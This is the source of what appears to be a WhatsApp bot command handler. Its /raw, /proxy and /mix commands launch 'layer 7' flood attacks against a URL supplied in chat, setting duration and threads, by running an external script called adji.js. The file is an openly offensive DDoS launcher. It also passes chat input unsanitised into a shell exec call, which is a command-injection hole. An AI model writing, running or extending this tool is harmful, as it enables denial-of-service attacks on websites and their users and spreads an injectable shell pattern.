const { exec } = require('child_process');
const chalk = require('chalk');

module.exports = async (conn, chatUpdate) => {
    const m = chatUpdate.messages[0];
    const messageContent = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
    const jid = m.key.remoteJid;

    if (messageContent.startsWith('/')) {
        const [command, ...args] = messageContent.slice(1).trim().split(/ +/);

        switch (command.toLowerCase()) {
            case 'help':
            case 'start': {
                await conn.sendMessage(jid, {
                    text: "`/help - start cmd`\n`/start - start cmd`\n`/raw - default attack`\n`/proxy - proxy attack`\n`/mix - mix attack`",
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: "AILI - ARCHISO",
                            body: `STRIKER - DEMOBOT`,
                            thumbnailUrl: 'https://images.hdqwalls.com/download/fsociety-mr-robot-4n-3840x2400.jpg',
                            sourceUrl: "https://blackarch.org/",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                });
                break;
            }
            case 'raw':
            case 'proxy':
            case 'mix': {
                const [target, time, threads] = args;

                if (parseInt(time, 10) > 230) {
                    await conn.sendMessage(jid, { text: `Error: Time parameter cannot be greater than 230 seconds.` }, { quoted: m });
                    break;
                }

                if (!target || !time || !threads) {
                    await conn.sendMessage(jid, { text: `Usage: /${command} <url> <time> <threads>\nExample: /${command} https://localhost 60 2` }, { quoted: m });
                    break;
                }

                const cmd = `node adji.js ${target} ${time} ${command} ${threads}`;
                conn.sendMessage(jid, {
                    text: `Sent *${command}* (layer 7) attack to:\n*Url:* ${target}\n*Time:* _${time}_\n*Threads:* _${threads}_`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: "AILI - ARCHISO",
                            body: `Adji Saputra JS`,
                            thumbnailUrl: 'https://wallpaperaccess.com/full/1228040.jpg',
                            sourceUrl: "https://blackarch.org/",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                });

                exec(cmd, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Error executing command: ${error.message}`);
                        conn.sendMessage(jid, {
                            text: `Attack ended!`,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: "AILI - ARCHISO",
                                body: `Attack has ended!`,
                                thumbnailUrl: 'https://wallpapercave.com/wp/wp2618253.jpg',
                                sourceUrl: "https://blackarch.org/",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                        });
                        return;
                    }
                    if (stderr) {
                        console.error(`Error output: ${stderr}`);
                        conn.sendMessage(jid, { text: `Error output: ${stderr}` }, { quoted: m });
                        return;
                    }
                });
                break;
            }
            default:
                await conn.sendMessage(jid, { text: `Unknown command: ${command}\nType /help to see available commands.` }, { quoted: m });
        }
    } else {
        console.log(chalk.greenBright(`Received non-command message: ${messageContent}`));
    }
};
